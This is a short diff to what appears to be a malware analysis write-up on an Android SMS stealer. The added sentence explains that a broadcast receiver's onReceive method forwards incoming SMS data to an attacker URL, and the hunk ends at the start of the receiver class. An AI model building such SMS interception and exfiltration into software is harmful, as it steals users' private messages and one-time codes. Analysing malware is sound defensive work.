@@ -232,6 +232,8 @@ For SMS stealer behavior, the malicious application statically declares a broadc
         </activity>
 ```
 
+In the class MyReciever, the method onReceive will be triggered when an SMS is coming in and the application will send the SMS data to the attacker URL. Here's the code:
+
 ```
 public class SmsReceiver extends BroadcastReceiver {
     private static final String TAG = "SmsReceiver";
